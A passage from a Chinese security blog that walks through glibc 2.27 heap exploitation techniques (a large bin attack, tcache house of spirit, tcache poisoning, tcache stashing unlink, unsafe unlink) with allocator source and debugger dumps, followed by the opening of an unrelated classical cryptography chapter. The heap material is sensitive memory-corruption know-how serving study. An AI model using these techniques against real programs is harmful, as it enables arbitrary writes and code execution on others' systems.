<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line">......</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br></pre></td></tr></table></figure>
<p>首先判断当前map中是否有满足请求大小的chunk，如果没有则查找下一个map，直至找到为止。如果都没有找到则通过top chunk分配。外层if判断条件为<code>bit &gt; map || bit == 0</code>，即当前map中没有满足的chunk或bit溢出，则查找后面的map，后面的map只要找到一个不为0的就说明有满足的chunk，就选择第一个非零的map。退出循环后while（line 4000）的条件为<code>(bit &amp; map) == 0</code>，即如果找到了chunk就确认bit并返回。<strong>（注意：执行到这一步时一定可以找到chunk，因为map非0且bit从1开始查找，所以才会有循环中的assert断言）</strong></p>
<p>找到有chunk的bin之后，选择最后一个chunk。后面再次检查这个bin是否为空（line 4011），如果为空说明前面的比特位有误，将其清除之后重新循环判断。</p>
<p>如果确认有chunk存在，选择最后一个chunk并获取其size，并断言这个size大于请求的size（line 4023）。计算切割该chunk后剩下的大小remainder_size。然后unlink将该chunk从bins中安全取出（line 4028）。</p>
<p>后面判断remainder_size是否小于最小chunk的size（0x20）。如果是则干脆将整个chunk全部分配出去，结束。（line 4031）</p>
<p>如果不是，将获取分割后的chunk的头部地址（line 4041），并将这个chunk插入到unsorted bin的头指针之后，也就是第一的位置（line 4049 ~ 4052）。之后如果申请大小在small bins范围则设置last_remainder为该chunk（line 4055），如果是large bin大小的chunk则将fd_nextsize和bk_nextsize置空（line 4057 ~ 4061）。之后设置一些标志位就可以返回了。</p>
<hr />
<p>根据上面的分析结果，可以知道，在两个chunk被链入到large bins之后，会选择较小的那个chunk，即p1进行切割，剩余大小为0x3f0。因此此次malloc之后将会有p1的残余留在unsorted bin，p2进入large bins。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6032f0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dcdca0</span><br><span class="line">bk: 0x7ffff7dcdca0</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x6036b0</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x7ffff7dce0d0</span><br><span class="line">bk: 0x7ffff7dce0d0</span><br><span class="line">fd_nextsize: 0x6036b0</span><br><span class="line">bk_nextsize: 0x6036b0</span><br></pre></td></tr></table></figure>
<p>后面释放p3，unsorted bin中就链入了两个chunk。</p>
<p><strong>Step 2: 修改p2的4个指针</strong></p>
<p>要修改的栈区地址为0x7fffffffe260~0x7fffffffe270。将p2的指针修改为如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:0000│     0x6036b0 ◂— 0x0</span><br><span class="line">01:0008│     0x6036b8 ◂— 0x3f1			// size改小</span><br><span class="line">02:0010│     0x6036c0 ◂— 0x0			// fd置空</span><br><span class="line">03:0018│     0x6036c8 —▸ 0x7fffffffe250 —▸ 0x7fffffffe370 ◂— 0x1		// bk设为target_addr - 0x10</span><br><span class="line">04:0020│     0x6036d0 ◂— 0x0			// fd_nextsize置空</span><br><span class="line">05:0028│ rdx 0x6036d8 —▸ 0x7fffffffe248 —▸ 0x400620 (_start) ◂— xor    ebp, ebp		// bk_nextsize设为target_addr - 0x18</span><br></pre></td></tr></table></figure>
<p><strong>Step 3: malloc(0x90)</strong></p>
<p>之后，一场好戏的开始只需要malloc一个0x100的chunk。让我们凑近点看看，下面到底会发生什么。</p>
<p>首先到达判断是否切割last_remainder。<font color=red><strong>注意：切割last_remainder的条件还是比较苛刻的，需要4个条件同时满足：(1) last_remainder存在，(2) 要分配的大小在small bins范围，(3) 这个last_remainder是unsorted bin里面唯一一个chunk，(4) 这个last_remainder的大小要大于(申请大小+最小chunk的大小【0x20】)。</strong></font>很明显这里第3个条件不满足，因为此时unsorted bin中不仅有p1的残余还有p3。首先将p1放入small bins（此时p1的size=0x3f0，正好是最后一个small bins存放的大小），然后将p3放入large bins，与p2应该放在一个bins中。</p>
<p>将p2放入large bins的同时会将栈区的内容修改掉，步骤如下图所示，与上一篇文章的house_of_storm的流程实际上是相同的：</p>
<p><img src="https://img-blog.csdnimg.cn/fcea4765c18e4c10aaab01f8d6299792.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="" /></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3820~3822, Step 1, 2</span></span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">// line 3856~3859, Step 3, 4, 5, 6</span></span><br><span class="line">	victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">// line 3861, Step 7</span></span><br><span class="line">	bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">// line 3869~3872, Step 8, 9, 10, 11</span></span><br><span class="line">	victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>这样就将两个栈区内容成功修改。</p>
<h1 id="10-mmap_overlapping_chunks"><a class="markdownIt-Anchor" href="#10-mmap_overlapping_chunks"></a> 10. mmap_overlapping_chunks</h1>
<p>经过检查，2.27的源码和2.23完全相同，这里不再赘述，本身也不难的一个漏洞，参见第4篇文章。</p>
<h1 id="11-overlapping_chunks"><a class="markdownIt-Anchor" href="#11-overlapping_chunks"></a> 11. overlapping_chunks</h1>
<p>这个也和2.23没什么区别，只是将chunk的大小增大到tcache无法容纳从而绕过tcache而已，也不赘述了。</p>
<h1 id="12-poison_null_byte"><a class="markdownIt-Anchor" href="#12-poison_null_byte"></a> 12. poison_null_byte</h1>
<p>同上，略。</p>
<h1 id="13-tcache_house_of_spirit"><a class="markdownIt-Anchor" href="#13-tcache_house_of_spirit"></a> 13. tcache_house_of_spirit</h1>
<p><strong>Step 1: 初始化堆</strong></p>
<p>随便malloc一块即可。</p>
<p><strong>Step 2: 构造栈区</strong></p>
<p>在栈区开0x88大小的空间，开头0x8备用。其后的0x80大小作为一个假的chunk，设置其size=0x40。</p>
<p><strong>Step 3: 释放假chunk后重新分配</strong></p>
<p>现在将栈区的这个假chunk释放，它能够成功进入tcache。在下一次分配时也能够返回这里的地址。</p>
<p>整个漏洞利用的流程很简单，即tcache不会去过多检查要释放的地址，这里仅仅设置了一个size就能够成功通过检查链入tcache。要想知道为什么，我们需要查看_int_free的源码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>可以看到，释放时通过chunk的size来确定存入哪一个tcache中，因此要将size设置为正确的值。之后只需要这个tcache不满，就能够链入，不加任何检查，如此看来，2.27版本的tcache比fastbin还要容易利用。</p>
<h1 id="14-tcache_poisoning"><a class="markdownIt-Anchor" href="#14-tcache_poisoning"></a> 14. tcache_poisoning</h1>
<p>这个漏洞利用比上一个还简单，和2.23的fastbin attack类似。</p>
<p>分配两个大小相同的不大的chunk并释放，两个chunk进入tcache，修改任意一个chunk的fd到想要的地址，然后分配出来就行了。不多赘述。</p>
<h1 id="15-tcache_stashing_unlink_attack"><a class="markdownIt-Anchor" href="#15-tcache_stashing_unlink_attack"></a> 15. tcache_stashing_unlink_attack</h1>
<p>这个漏洞可以使malloc返回任意地址。</p>
<p><strong>Step 1: 构造堆、栈结构</strong></p>
<p>在栈上布置假chunk，大小0x80，并将bk指针指向其fd。在堆中首先分配并释放7个chunk到tcache，然后再释放2个相同大小chunk到unsorted bin。这些chunk的指针均存放在栈上，其中第0、2个chunk被释放到unsorted bin，剩余被释放到tcache，释放顺序为：3、4、5、6、7、8、1。然后分配一个大一些的chunk使unsorted bin中2个chunk进入small bins。然后分配2个tcache chunk回去使得tcache中只有5个chunk。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6036c0 —▸ 0x603620 —▸ 0x603580 —▸ 0x6034e0 —▸ 0x603440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x603390 —▸ 0x603250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x603390</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p><strong>Step 2: 修改small bins中第一个chunk（0x603390）的bk指针为栈区的假chunk。</strong></p>
<p><strong>Step 3: 分配一个chunk出来，即可使栈区假chunk链入tcache头部。</strong></p>
<p>这里使用calloc分配chunk，但是calloc还是要调用_int_malloc函数。<br />
在调用之后，bins的结构变成了这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x7fffffffe120 —▸ 0x6033a0 —▸ 0x6036c0 —▸ 0x603620 —▸ 0x603580 —▸ 0x6034e0 —▸ 0x603440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x603390 —▸ 0x6036c0 ◂— 0x0</span><br><span class="line">BK: 0x7fffffffe120 ◂— 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>可以看到栈区假chunk被成功链入，后面跟着的是原small bins中的第二个chunk，但是地址偏移了0x10。返回的是第0个chunk，在bins中已经找不到。</p>
<p>我们还是通过源码来分析一下这个过程的原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			  set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>上面就是这个过程涉及的源码。可以看到这里是从末尾开始遍历small bins，发现tcache没有填满时会调用tcache_put函数将这个chunk移至tcache的头部，同时调整small bins结构。这里和fastbin类似的一点就是不会进行检查，当tcache内部指针数量达到7个时就会直接退出。</p>
<p>在这个示例中，_int_malloc函数首先将small bins中末尾的chunk，即0x603250弹出small bins准备后面返回，这样small bins中就只剩下了0x603390。因为我们将第一个chunk的bk改掉了，所以这里libc会误以为small bins不止一个chunk。在链入0x603390之后又会链入栈区的这个地址，而此时刚好，tcache满了，直接退出，完美。</p>
<p><strong>Step 4: malloc分配出栈区地址。</strong></p>
<p>此时栈区地址应该是写在了tcache的头部，直接malloc即可。</p>
<h1 id="16-unsafe_unlink"><a class="markdownIt-Anchor" href="#16-unsafe_unlink"></a> 16. unsafe_unlink</h1>
<p>2.27中关于unlink的利用与2.23类似，只是分配的chunk更大绕过了tcache而已。这里不具体分析漏洞的利用方式了，如有疑问请参考第5篇文章。这里分析一下unlink这个函数具体干了什么。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);			      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);			      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>unlink的第1个参数是malloc_state，一般来说就是main_arena。第2个参数是当前需要脱链的chunk。第3个chunk是P-&gt;bk，第4个为P-&gt;fd。</p>
<p>首先进行检查：FD-&gt;bk == BK-&gt;fd == P，正常情况下这是一定成立的，这是为了防止堆结构被修改。</p>
<p>如果这个chunk在small bins中或者在large bins中但fd_nextsize不为空，则进行双向链表的经典脱链操作：<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>。然后直接返回。<strong><font color=red>注意：这里需要思考一下large bins的结构，在一个large bins中由于chunk的大小不一定相同，在正常情况下，一个large bin中的chunk是按照大小有序排列的，其中bins头存放的是最大的chunk。如果一个bins中有几个chunk的大小相等，那么这些chunk一定是连接在一起的，而且只有第一个chunk拥有fd_nextsize和bk_nextsize指针，其他chunk的这两个指针为空。因为在需要遍历large bins时只需要第一个chunk有这两个指针就能够找到下一个大小不同的chunk。所以如果要进行unlink的不是有fd_nextsize的chunk，则说明这个chunk在large bins中被unlink之后无需重新调整前后fd_nextsize和bk_nextsize，因此可以和small bins一样直接脱链即可。</font></strong></p>
<p>如果这个chunk在large bins中而且还拥有fd_nextsize，则操作要复杂很多。因为fd_nextsize和bk_nextsize需要定位前后第一个大小不同的chunk，如果将这个chunk脱链，那么fd_nextsize和bk_nextsize链也就会断裂，这个时候需要进行调整。学过数据结构的同学应该已经有思路了，这里应该分为两种情况讨论：</p>
<ol>
<li>
<p>如果这个bins中没有与当前chunk大小相同的chunk，那么其FD的fd_nextsize一定不为空，此时只需直接令P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize，P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize即可恢复原来的结构。</p>
</li>
<li>
<p>如果这个bins中有与当前chunk大小相同的chunk，为维持原有结构，我们应该将fd_nextsize和bk_nextsize赋值给下一个与其大小相同的chunk，让其作为新的nextsize结点。如果这个bins中只有这一种大小的chunk，那就直接将后面一个chunk的fd_nextsize和bk_nextsize改为其自身即可；否则对应修改后面chunk的fd_nextsize为P-&gt;fd_nextsize，bk_nextsize为P-&gt;bk_nextsize，再让前后的nextsize对应chunk指向这个chunk即可。</p>
</li>
</ol>
<p>由此可见，unlink仅仅完成了一个chunk的脱链操作，这个chunk应该位于small bins或large bins中。只要理解了两个bins的数据结构，就应该不难理解其中的原理。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/" class="post-title-link" itemprop="url">密码学基础 Chapter 1——古典密码学</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:12" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:12+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Chapter-1-古典密码学"><a href="#Chapter-1-古典密码学" class="headerlink" title="Chapter 1 古典密码学"></a>Chapter 1 古典密码学</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><ol>
<li>密码学是提供安全服务的关键理论和技术，包含：数据机密性、数据完整性、鉴别、不可否认等。</li>
<li>密码学与隐写术的区别：隐写术通过隐藏消息的存在来保护消息，常用手段有：隐形墨水、字符格式变化、图形图像等，而密码学是将消息本身加密成为密文后发送，可以隐藏，也可以不隐藏，关键不在于隐藏，而在于解密。</li>
<li>发送者将消息通过不安全信道发送给接受者，想要确保除了接受者之外没有其他人能够阅读发送的消息。</li>
<li>明文：要传输的消息；密文：加密后的消息；加密：用某种方法伪装消息以隐藏其内容的过程；解密：将密文还原为明文的过程；秘钥：预先确定的用于加解密过程的参数。</li>
<li>加密算法：对明文加密操作采用的一组规则；解密算法：对密文解密采用的一组规则；密码算法：用于加密和解密的数学函数。</li>
<li>按明文处理方式可将密码分为分组密码和流密码。分组密码事先将明文分成若干组，对每组采用同样的加密方式加密，再将每组加密的密文相接形成密文。流密码分组后对每一组使用不同加密方式加密，然后将密文相接形成总的密文。按明文保密条件可分为受限制算法和基于秘钥算法。<br> (1) 受限制的算法：安全性基于算法的保密性（这种密码实际上并不安全）<br> (2) 基于密钥的算法：安全性基于密钥的安全性，算法本身可以公开。基于密钥的算法通常分为对称密码算法和公开密钥算法<font color=red>（Kerckhoffs假设）</font>。其中对称加密算法是指加密密钥和解密密钥相同或可以互相推导的密码算法，公开密钥算法的加密密钥和解密密钥实质不同，已知信息下无法相互推导（非对称密钥算法）。</li>
<li>加密通信模型：Alice和Bob双方通过加密机和解密机进行密文解密和明文加密，将密文通过不安全信道传输，不安全信道中有攻击者Oscar截获明文。对称密钥系统存在一个密钥源为Alice和Bob双方分配密钥，分配密钥的过程完全安全，Oscar无法窃听；非对称密钥系统中的密钥源是公开的，任何人都能够互获取，但Alice和Bob都有自己不公开的私钥用于解密。</li>
<li>密码体制数学描述：<br> 一个五元组$$(P, C, K, E, D)$$满足条件：<br> (1) P为可能明文的有限集（明文空间）<br> (2) C为可能密文的有限集（密文空间）<br> (3) K为一切可能密钥构成的有限集（密钥空间）<br> (4) E是加密算法的有限集<br> (5) D是解密算法的有限集<br> (6) 对 $\forall k \in K , \exist e_k \in E, \exist d_k \in D \Rightarrow e_k: P \rightarrow C, d_k: C \rightarrow P, d_k(e_k(x)) &#x3D;  x (x \in P)$ （加密函数必须为单射函数，否则一个明文可能解密出多个密文）</li>
<li>古典密码实现技术：<br> (1) 代换：加密将明文字符按对应关系代换为对应的密文字符，解密则反过来操作。密钥为明密文字符之间的对照关系。包含：单表代换、多表代换（维吉尼亚密码）、多字符代换等。<br> (2) 置换：将明文字符按照一定规则移动位置得到密文，字符本身不变。解密则反过来进行。密钥为移位规则。</li>
</ol>
<h2 id="二、几种古典密码"><a href="#二、几种古典密码" class="headerlink" title="二、几种古典密码"></a>二、几种古典密码</h2><ol>
<li><strong>移位密码</strong><br> 将字母表中每个字母向后移动若干位作为密文字符。可通过密文字符频率分析破解或暴力破解（唯密文攻击）$a b$<br> 数学描述：<br> $P &#x3D; C &#x3D; K &#x3D; Z_{26}$<br> 对$k, x, y \in Z_{26}$，定义有<br> $e_k(x) &#x3D; (x+k) \mod 26$<br> $d_k(y) &#x3D; (y-k) \mod 26$<br> k&#x3D;3时称为凯撒密码</li>
<li><strong>代换密码</strong><br> 建立一个明文字符与密文字符的一一对应关系，将明文对应字符替换为密文字符。也可以通过密文字符频率破解（唯密文攻击）<br> 数学描述：<br> $P &#x3D; C &#x3D; Z_{26}$<br> K是由26个数字0, 1, … 25所有可能的置换组成<br> 对任意置换$\pi \in K$，定义有<br> $e_\pi(x) &#x3D; \pi(x), d_\pi(y) &#x3D; \pi^{-1}(y)$</li>
<li><strong>仿射密码</strong><br> 其机制与移位密码类似，将明文字符通过模线性变换ax+b成为密文字符。可通过密文字符频率破解（唯密文攻击）<br> 数学描述：<br> $P &#x3D; C &#x3D; Z_{26}$<br> $K&#x3D;{(a,b)\in Z_{26}\times Z_{26}: \gcd(a,26)&#x3D;1}$<br> 对$\forall k&#x3D;(a,b)\in K， x,y\in Z_{26}$，定义<br> $e_k(x)&#x3D;(ax+b)\mod 26, d_k(y)&#x3D;a^{-1}(y-b)\mod 26$<br> 其中$\gcd(a,26)&#x3D;1$是为了满足单射的条件。<br> 当a&#x3D;1时即为移位密码</li>
